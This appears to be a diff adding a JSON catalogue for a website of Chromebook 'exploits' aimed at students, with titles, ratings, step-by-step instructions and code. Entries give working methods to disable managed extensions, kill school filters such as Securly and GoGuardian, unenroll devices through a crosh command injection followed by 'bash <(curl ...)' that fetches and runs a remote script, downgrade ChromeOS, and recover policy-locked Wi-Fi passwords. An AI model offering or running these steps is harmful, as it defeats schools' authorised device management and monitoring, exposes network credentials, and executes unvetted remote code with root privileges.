@@ -1,0 +1,112 @@
+[
+    {
+        "title": "LTBEEF",
+        "description": "An exploit that allows you to disable managed extensions on versions under v106",
+        "image": "/images/ltbeef.png",
+        "instructions": "1. Get the extension ids from chrome://extensions. Clicking Details and copying everything after = | 2. Go to https://chrome.google.com/webstorexyz\n  | 3. Run the bookmarklet below.",
+        "rating": "4",
+        "code": "javascript:prompt('Extension IDs here: (seperated by commas)').split(',').forEach(i=>{chrome.management.setEnabled(i.trim(),!1)})"
+    },
+    {
+        "title": "Shroot",
+        "description": "An exploit that allows you to get full control of your Chromebook with Shell / Root and unenrolls it. Works on version v101",
+        "image": "/images/shroot.png",
+        "instructions": "* DISCLAIMER DO NOT DO THIS UNLESS YOU HAVE ADVANCED KNOWLEDGE OF CHROMEOS * UnEnroll: 1. Open Crosh & Type in set_cellular_ppp \\';bash;exit;\\' and enter | 2. Type in bash <(curl https://coolelectronics.me/unroll) and enter | 3. Wait for the script to finish and then powerwash chromebook. ReEnroll: 1. Enable DevMode (ESC+POWER+RELOAD, Ctrl D and enter on recovery screen) | 2. When in chrome, Open Crosh (ctrl + alt + t) | 3. Type in Shell & Type in sudo vpd i RW_VPD -s check_enrollment=1 | 4. Powerwash Again ",
+        "code": "set_cellular_ppp \\';bash;exit;\\'\n bash <(curl https://coolelectronics.me/unroll)\n Shell\n sudo vpd i RW_VPD -s check_enrollment=1",
+        "rating": "5"
+    },
+    {
+        "title": "Swamp",
+        "description": "An exploit that allows you to disable managed extensions, run bookmarklets on pages (even when blocked), break goguardian until powerwash, access to most of chrome api, and run a custom filter to block like a DNS. Works on any version except for v104",
+        "image": "/images/swamp.png",
+        "instructions": "1. Go to the ChromeOS settings app and search for 'DNS', then click the first option | 2. Click 'Custom name servers' (note that this will likely not work on a school network) | 3. Set all four boxes to 0.0.0.0 and wait a few seconds | 4.  Set the first box to 150.136.6.90 (credit to The Greater Giant for hosting this server) | 5. In a new tab, go to https://tinyurl.com/s-w-a-m-p (or chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/background.html) (should be a blank white screen) | 6. On this page, press ctrl+shift+r and wait for the page to finish loading (it should still be a blank screen) | 7. In the same tab, go to https://ssl.google-analytics.com/swamp (and maybe do ctrl+shift+r) | 8. You should get a warning message from Chrome (if you do not, then there is an issue with your DNS setup, try a hotspot maybe) | 9. Type thisisunsafe on your keyboard to bypass this warning (make sure you don't typo) | 10. You should now be in [swamp]! If you can keep pressing ctrl+shift+r on the extension page and [swamp] keeps loading, then you've set it up correctly. If it doesn't, then you'll have to go back to the Google Analytics link and do thisisunsafe again. ",
+        "rating": "4"
+    },
+    {
+        "title": "KillCurly",
+        "description": "An exploit that allows you to kill Securly, Cisco Umbrella, Palo Alto, and Hapara",
+        "image": "/images/killcurly.png",
+        "instructions": "1. Go to chrome://settings/signOut and click the blue button. | 2. Go to chrome://restart or go to Securly details in chrome://extensions and click Allow access to file URLs or use chrome://kill on one of its extension pages. | 3. Go to /addsession and add your school account back.",
+        "rating": "4"
+    },
+    {
+        "title": "Downgrading",
+        "description": "A method to reduce your chrome version allowing you to get access to versions that have exploits on them.",
+        "image": "/images/downgrading.png",
+        "instructions": "1. Go to chrome://version and look for your version. | 2. On your personal computer go to anylucidurl.com/downgrade and do ctrl + f plus your board and download the recovery media you want. | 3. On your personal computer download the chrome recovery utlity extension. Start the extension, click use local image, and select the recovery media you downloaded and then use your usb/sd drive. | 4. press esc + refresh + power on your chromebook and follow the prompts | 5. Once your chromebook is done recovering sin into your wifi and proceed to press ctrl + alt + e on the checking for updates screen. A blue briefcase will be on the enterprise enrollment screen.",
+        "rating": "5"
+    },
+    {
+        "title": "UpdateBlocker",
+        "description": "An exploit that allows you to block automatic chromeos updates. Works on versions after v84",
+        "image": "/images/updateblocker.png",
+        "instructions": "View /updateblocker for detailed instructions + tool.",
+        "rating": "3"
+    },
+    {
+        "title": "DNS Bypass",
+        "description": "A method that allows you to disable whatever blocker your school uses.",
+        "instructions": "1. Go to chrome://os-settings/networks?type=WiFi | 2. Click on the current WiFi you are using. | 3. Hit the button that says Network | 4. Scroll down and hit Custom Nameservers | 5. In each of the 4 boxes paste one of the DNS addresses of your choice. ",
+        "image": "/images/dnsbypass.png",
+        "rating": "4"
+    },
+    {
+        "title": "Inspect LTBEEF",
+        "description": "A variation of the exploit LTBEEF which allows you to disable managed extensions",
+        "instructions": "1. Go to https://tinyurl.com/i-ltbeef | 2. Run the LTBEEF code found below. ",
+        "code": "chrome.management.setEnabled('extensionid',!1)",
+        "image": "/images/inspectltbeef.png",
+        "rating": "4"
+    },
+    {
+        "title": "Wifi Password",
+        "description": "A method to get access to the wifi password of a policy locked wifi network.",
+        "image": "/images/wifipassword.png",
+        "instructions": "1. Go to chrome://net-export and click select raw bytes and start logging, go to chrome://policy reload policies and wait for it to finish | 2. Go to chrome://net-exports and hit stop recording. | 3. Go to /wifipass and upload the log there.",
+        "rating": "3"
+    },
+    {
+        "title": "AddSession",
+        "description": "An exploit that allows you to add a personal account to websites like Gmail or YouTube",
+        "image": "/images/addsession.png",
+        "instructions": "1. Go to chrome://settings/signOut | 2. Clear your cookies on google.com. | 3. Then go to tinyurl.com/addsession to add an account",
+        "rating": "2"
+    },
+    {
+        "title": "PlaystoreBypass",
+        "description": "An exploit that allows you to gain access to a completely unblocked PlayStore",
+        "image": "/images/playstorebypass.png",
+        "instructions": "1. Downgrade | 2. Open Playstore downloads, open settings, click on Apps, and then the arrow to Manage Android Preferences | 3. Click on accounts and add personal account. | 4. Open playstore and click on 3 lines on the top left corner. Select the account you just added.",
+        "rating": "3"
+    },
+    {
+        "title": "WebstoreBypass",
+        "description": "An exploit that allows you to gain access to a completely unblocked Webstore."   ,
+        "image": "/images/webstorebypass.png",
+        "instructions": "1. Downgrade | 2. Add a personal Gmail account, if it is blocked use addession. | 3. Go to https://chrome.google.com/webstore/category/extensions?hl=en&gl=US&authuser=1 and navigate to Webstore.",
+        "rating": "3"
+    },
+    {
+        "title": "ExtensionKill",
+        "description": "An exploit that will kick the desired extension off the device for around 3 seconds",
+        "image": "/images/extensionkill.png",
+        "instructions": "1. Go to chrome-extension://extensionid/_generated_background_page.html | 2. Make a bookmarklet with the url chrome://kill | 3. Run it on the page and your extension will be killed for 3 seconds.",
+        "code": "chrome://kill",
+        "rating": "2"
+    },
+    {
+        "title": "Unenrollment",
+        "description": "An exploit that will allow you to unenroll your chromebook completely.",
+        "instructions": "DISCLAIMER DO NOT DO THIS UNLESS YOU HAVE ADVANCED KNOWLEDGE OF CHROMEOS * UnEnroll: 1. Open Crosh & Type in set_cellular_ppp \\';bash;exit;\\' and enter | 2. Type in bash <(curl https://coolelectronics.me/unroll) and enter | 3. Wait for the script to finish and then powerwash chromebook. ReEnroll: 1. Enable DevMode (ESC+POWER+RELOAD, Ctrl D and enter on recovery screen) | 2. When in chrome, Open Crosh (ctrl + alt + t) | 3. Type in Shell & Type in sudo vpd i RW_VPD -s check_enrollment=1 | 4. Powerwash Again ",
+        "code": "set_cellular_ppp \\';bash;exit;\\'\n bash <(curl https://coolelectronics.me/unroll)\n Shell\n sudo vpd i RW_VPD -s check_enrollment=1",
+        "image": "/images/unenrollment.png",
+        "rating": "5"
+    },
+    {
+        "title": "Incognito",
+        "description": "An exploit that will allow you to gain access to Incognito mode. Works on versions v81 and under.",
+        "instructions": " getting on the login screen to the part where you are signing in as a new user. Enter your email and password but don't login. Do Alt + Shift + I. Continue to Step 1 where you spam Privacy Policy | 2. Spam Privacy Policy for a minute to 30 seconds until it is laggy | 3. Once you login go to the Incognito Tab and do Ctrl + Shift + N | 4. Do the Switch/Desktop View key and close original Incognito Tab | 4. If it continues to open policy pages, repeat part 3.",
+        "image": "/images/incognito.png",
+        "rating": "3"
+    }
+]
